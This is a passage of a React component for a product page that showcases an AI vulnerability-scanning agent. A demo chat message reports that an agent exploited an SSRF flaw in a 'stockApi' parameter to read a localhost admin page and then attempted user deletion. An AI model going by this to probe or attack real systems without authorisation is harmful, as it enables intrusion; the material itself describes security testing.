            "message": "SSRF vulnerability confirmed in `stockApi`, successfully accessing the `/admin` page via SSRF. However, attempts to exploit administrative actions (user deletion) were blocked by access control mechanisms (401 Unauthorized).\n\n**Final Findings:**\n1.  **SSRF Vulnerability:** `stockApi` allows reading internal resources like `http://localhost/admin`, exposing admin data.\n2.  **Access Control Issue:** While `/admin` is readable via SSRF, actions are protected by access controls requiring admin/loopback.\n\n**Conclusion:** Significant risk due to SSRF exposing internal data, but impact partially mitigated by access controls preventing direct action execution via SSRF. No further obvious exploitation paths at this stage. **TERMINATE**"
        }
    ]
      
      
    }
  ],
  className
}: AnimatedHorizontalCardsProps) {
  const containerRef = useRef<HTMLDivElement>(null);
  const cardsRef = useRef<HTMLDivElement>(null);
  const chatRef = useRef<HTMLDivElement>(null);
  const [activeCardIndex, setActiveCardIndex] = useState(0);

  useEffect(() => {
    gsap.registerPlugin(ScrollTrigger);
    
    // Auto-scroll to bottom of chat
    if (chatRef.current) {
      chatRef.current.scrollTop = chatRef.current.scrollHeight;
    }
    
    const ctx = gsap.context(() => {
      const cardElements = cardsRef.current?.querySelectorAll('.scroll-card');
      
      if (cardElements && cardElements.length > 0) {
        gsap.fromTo(
          cardElements,
          { 
            x: 100,
            opacity: 0.3,
            scale: 0.9
          },
          {
            x: 0,
            opacity: 1,
            scale: 1,
            stagger: 0.1,
            ease: 'power2.out',
            scrollTrigger: {
              trigger: containerRef.current,
              start: 'top 80%',
              end: 'bottom 60%',
              toggleActions: 'play none none reverse',
              markers: false
            }
          }
        );
      }
      
      // Animate chat messages
      const messageElements = document.querySelectorAll('.chat-message');
      gsap.fromTo(
        messageElements,
        { 
          y: 20,
          opacity: 0
        },
        {
          y: 0,
          opacity: 1,
          stagger: 0.1,
          duration: 0.4,
          scrollTrigger: {
            trigger: chatRef.current,
            start: 'top 100%',
            toggleActions: 'play none none none'
          }
        }
      );
    }, containerRef);
    
    return () => ctx.revert();
  }, []);

  const handleCardClick = (index: number) => {
    setActiveCardIndex(index);
  };

  const goToNext = () => {
    setActiveCardIndex((prev) => (prev === cards.length - 1 ? 0 : prev + 1));
  };

  const goToPrev = () => {
    setActiveCardIndex((prev) => (prev === 0 ? cards.length - 1 : prev - 1));
  };

  return (
    <div ref={containerRef} className={cn("w-full overflow-hidden py-10", className)}>
      <div className="">
        <div className="mb-8 text-center">
          <h2 className="text-3xl font-bold tracking-tighter mb-4">See our agent at work</h2>
          <p className="text-muted-foreground max-w-[700px] mx-auto">
            Witness the power of AI-driven vulnerability detection in action
          </p>
        </div>
      </div>
      
      <div 
        ref={cardsRef} 
        className="relative flex items-center justify-center h-[600px] w-full overflow-visible py-4 px-4"
      >
        {cards.map((card, index) => {
          // Calculate position relative to active card with looping
          let position = index - activeCardIndex;
          
          // Adjust position for looping effect
          if (position < -Math.floor(cards.length / 2)) {
            position += cards.length;
          } else if (position > Math.floor(cards.length / 2)) {
            position -= cards.length;
          }
          
          return (
            <div 
              key={index} 
              className={cn(
                "absolute top-0 transition-all duration-500 ease-in-out cursor-pointer",
                position === 0 ? "z-30" : Math.abs(position) === 1 ? "z-20" : "z-10"
              )}
              style={{
                transform: position === 0 
                  ? 'translateX(0) scale(1)' 
                  : position === -1 
                    ? 'translateX(-85%) scale(0.85)' 
                    : position === 1 
                      ? 'translateX(85%) scale(0.85)' 
                      : position < -1 
                        ? 'translateX(-110%) scale(0.7)' 
                        : 'translateX(110%) scale(0.7)',
                opacity: Math.abs(position) > 1 ? 0.4 : Math.abs(position) === 1 ? 0.7 : 1
              }}
              onClick={() => handleCardClick(index)}
            >
              <Card className={cn(
                "min-w-[300px] md:min-w-[400px] lg:min-w-[500px] h-full border border-border/50 backdrop-blur-sm transition-all duration-300",
                position === 0 
                  ? "bg-background/90 shadow-xl" 
                  : "bg-background/50 shadow-md"
              )}>
                <CardHeader className="pb-3">
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <Terminal size={18} className="text-primary" /> 
                    {card.title}
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="mb-4 text-sm text-muted-foreground">{card.content}</p>
                  <div className="mt-4 h-[420px] rounded-md overflow-hidden flex flex-col bg-black border border-border/50">
                    {/* Chat header */}
                    <div className="px-3 py-2 border-b border-muted/20 bg-black flex items-center">
                      <div className="flex gap-1.5 mr-3">
                        <span className="h-2.5 w-2.5 rounded-full bg-red-500"></span>
                        <span className="h-2.5 w-2.5 rounded-full bg-yellow-500"></span>
                        <span className="h-2.5 w-2.5 rounded-full bg-green-500"></span>
                      </div>
                      <span className="text-xs font-medium text-gray-400">autoVuln-agent-terminal</span>
                    </div>
                    
                    {/* Chat messages */}
                    <div ref={chatRef} className="flex-1 overflow-y-auto p-3 space-y-3 font-mono text-sm bg-gradient-to-b from-black to-zinc-900">
                      {card.messages.map((msg, i) => (
                        <div key={i} className={cn(
                          "chat-message flex flex-col rounded-md p-2.5",
                          msg.isSystem 
                            ? "bg-primary/20 border border-primary/40 text-primary-foreground max-w-none mx-auto" 
                            : "bg-muted/10 border border-muted/20 max-w-[88%]"
                        )}>
                          <div className="flex items-center justify-between mb-1.5">
                            <span className={cn(
                              "text-s font-bold flex items-center gap-1",
                              msg.isSystem && "text-primary",
                              msg.agent === "attack_analysis_agent" && "text-blue-500 dark:text-blue-400",
                              msg.agent === "exploit_writer_agent" && "text-orange-500 dark:text-orange-400",
                              msg.agent === "exploit_executor_agent" && "text-red-500 dark:text-red-400",
                              msg.agent === "knowledge_assistant" && "text-green-500 dark:text-green-400",
                              msg.agent === "result_analyzer_agent" && "text-purple-500 dark:text-purple-400",
                              msg.agent === "security_teacher" && "text-yellow-500 dark:text-yellow-400"
                            )}>
                              {(() => {
                                const Icon = AGENT_ICONS[msg.agent];
                                return Icon ? <Icon className="inline-block w-4 h-4 mr-1 align-middle" /> : null;
                              })()}
                              {msg.agent}
                            </span>
                          </div>
                          <p className={cn(
                            "text-xs leading-relaxed",
                            msg.isSystem && "text-center font-bold ",
                            "max-w-[900px] break-words whitespace-pre-wrap"
                          )}>
                            {msg.message}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          );
        })}
      </div>
      
      {/* Navigation controls */}
      <div className="flex justify-center items-center mt-4 gap-4">
        <button 
          onClick={goToPrev}
          className="p-2 rounded-full bg-background/80 hover:bg-background shadow border border-border"
          aria-label="Previous card"
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="m15 18-6-6 6-6"/>
          </svg>
        </button>
        
        <div className="flex gap-1">
          {cards.map((_, index) => (
            <button
              key={index}
              className={cn(
                "w-2 h-2 rounded-full transition-all",
                index === activeCardIndex ? "w-4 bg-primary" : "bg-muted/50 hover:bg-muted"
              )}
              onClick={() => handleCardClick(index)}
              aria-label={`Go to slide ${index + 1}`}
            />
          ))}
        </div>
        
        <button 
          onClick={goToNext}
          className="p-2 rounded-full bg-background/80 hover:bg-background shadow border border-border"
          aria-label="Next card"
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="m9 18 6-6-6-6"/>
          </svg>
        </button>
      </div>
    </div>
  );
} 